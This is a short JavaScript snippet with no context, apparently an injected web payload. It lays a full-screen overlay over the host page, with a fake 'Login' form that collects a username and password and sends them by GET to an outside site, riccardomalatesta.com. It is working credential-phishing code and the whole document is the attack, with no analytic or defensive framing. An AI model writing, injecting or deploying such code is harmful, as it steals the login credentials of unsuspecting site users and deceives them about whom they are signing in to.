(function() {
  var overlay = document.createElement('div');
  overlay.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#f6f8fa;display:flex;align-items:center;justify-content:center;z-index:999999;">
      <form action="https://riccardomalatesta.com/" method="GET">
        <h2>Login</h2>
        <label>Username <input name="username" required></label>
        <label>Password <input type="password" name="password" required></label>
        <button type="submit">Sign in</button>
      </form>
    </div>`;
  document.body.appendChild(overlay);
})();
